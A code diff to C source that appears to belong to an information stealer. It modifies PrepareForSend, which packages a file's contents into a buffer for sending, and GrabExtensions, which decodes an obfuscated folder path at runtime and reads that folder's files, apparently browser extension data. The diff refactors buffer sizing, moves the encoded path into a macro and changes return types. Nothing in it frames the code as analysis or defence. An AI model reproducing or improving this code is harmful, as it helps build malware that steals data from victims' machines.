@@ -66,7 +66,8 @@ void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned s
 
             WideToNormal(FileNameC, FullFileName);
             FileSize = GetFileSizeY(FileHandle);
-            FullBufferSize = TotalBufferLength(FullFileName, FileSize);
+
+            FullBufferSize = 383 + lenW(FullFileName) + IntLen(FileSize) + FileSize;
 
             buffer = AllocMemory((SIZE_T)FullBufferSize);
             if (buffer == NULL) {
@@ -88,15 +89,15 @@ void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned s
 }
 
 
-int GrabExtensions(unsigned short *path) {
+void GrabExtensions(unsigned short *path) {
     unsigned short      TempPath[250]       = {0};
-    unsigned short      ExtentionsPath[34]  = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b2, 0x0075, 0x00b9, 0x003f, 0x0046, 0x00bc, 0x00a8, 0x00a5, 0x0093, 0x00bc, 0x0093, 0x00ae, 0x009e, 0x005e, 0x0071, 0x009a, 0x00a4, 0x00b8, 0x0099, 0x00a7, 0x009c, 0x00a5, 0x0000};
+    unsigned short      ExtentionsPath[34]  = EXTENSION_DATA;
     unsigned char       *FolderItems        = NULL;
     int                 PathSize            =  lenW(path);
 
     FolderItems = AllocMemory((SIZE_T)4096);
     if (FolderItems == NULL) {
-        return 100;
+        return;
     }
 
     DecodeStringW(ExtentionsPath);
@@ -105,7 +106,7 @@ int GrabExtensions(unsigned short *path) {
 
 
     if (ReadFolder(FolderItems, TempPath) != 0) {
-        return 10;
+        return;
     }
 
     PFILE_DIRECTORY_INFORMATION FileInfo = (PFILE_DIRECTORY_INFORMATION)FolderItems;
@@ -262,5 +263,4 @@ int GrabExtensions(unsigned short *path) {
     }
 
     FreeMemory(FolderItems);
-    return 0;
 }
